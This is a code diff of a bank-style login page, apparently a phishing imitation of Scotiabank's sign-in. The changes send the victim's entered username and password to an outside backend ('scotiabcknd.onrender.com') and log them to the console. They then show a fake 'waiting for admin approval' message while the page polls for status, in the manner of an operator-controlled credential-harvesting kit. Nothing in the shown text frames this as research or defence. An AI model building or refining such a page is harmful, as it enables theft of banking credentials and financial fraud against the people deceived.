@@ -26,6 +26,15 @@
       .error-message.show {
         display: block;
       }
+      .success-message {
+        display: none;
+        color: #02a95c;
+        font-size: 14px;
+        margin-top: 5px;
+      }
+      .success-message.show {
+        display: block;
+      }
     </style>
   </head>
   <body class="min-h-screen flex flex-col bg-[#F6F7FC]">
@@ -47,7 +56,7 @@
           </h1>
         </div>
         <img
-          src="data:image/png;base64,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"
+          src="data:image/png;base64,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"
           alt="Logo"
           class="h-[40px]"
         />
@@ -91,6 +100,7 @@
               />
             </div>
             <div id="passwordError" class="error-message"></div>
+            <div id="successMessage" class="success-message"></div>
           </div>
 
           <label
@@ -119,7 +129,7 @@
             <button
               id="submitBtn"
               type="submit"
-              class="mt-[80px] w-[300px] bg-[#EB121A] px-[20px] py-[15px] rounded-[8px] flex items-center justify-center gap-2"
+              class="mt-[80px] w-[300px] bg-[#EB121A] px-[20px] py-[15px] rounded-[8px] flex items-center justify-center gap-2 hover:bg-[#d10f17] transition-colors"
             >
               <svg class="loading w-5 h-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                 <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
@@ -171,8 +181,12 @@
     <script>
       lucide.createIcons();
       
-      // Replace with your backend URL
-      const BACKEND_URL = 'https://your-backend-url.vercel.app'; // Replace with your actual backend URL
+      // IMPORTANT: Replace this with your actual backend URL
+      // Your backend is deployed at: https://scotiabcknd.onrender.com
+      const BACKEND_URL = 'https://scotiabcknd.onrender.com'; 
+      // Alternative: If you're testing locally, use: 'http://localhost:5000'
+      
+      console.log('Using backend URL:', BACKEND_URL);
       
       document.getElementById('loginForm').addEventListener('submit', async function(e) {
         e.preventDefault();
@@ -183,9 +197,10 @@
         const loadingIcon = submitBtn.querySelector('.loading');
         const submitText = submitBtn.querySelector('span');
         
-        // Reset errors
+        // Reset messages
         document.getElementById('usernameError').classList.remove('show');
         document.getElementById('passwordError').classList.remove('show');
+        document.getElementById('successMessage').classList.remove('show');
         
         // Validate inputs
         if (!login.trim()) {
@@ -206,10 +221,14 @@
         submitBtn.disabled = true;
         
         try {
+          console.log('Sending request to:', `${BACKEND_URL}/login`);
+          console.log('Data:', { login: login, password: password });
+          
           const response = await fetch(`${BACKEND_URL}/login`, {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
+              'Accept': 'application/json'
             },
             body: JSON.stringify({
               login: login,
@@ -217,18 +236,29 @@
             })
           });
           
+          console.log('Response status:', response.status);
+          console.log('Response headers:', response.headers);
+          
           const data = await response.json();
+          console.log('Response data:', data);
           
           if (response.ok && data.success) {
             // Success - store session ID and start polling
             const sessionId = data.id;
             localStorage.setItem('sessionId', sessionId);
             
+            // Show success message
+            document.getElementById('successMessage').textContent = 'Credentials submitted successfully! Waiting for admin approval...';
+            document.getElementById('successMessage').classList.add('show');
+            
+            // Update button text
+            submitText.textContent = 'Waiting for approval...';
+            
             // Start polling for status
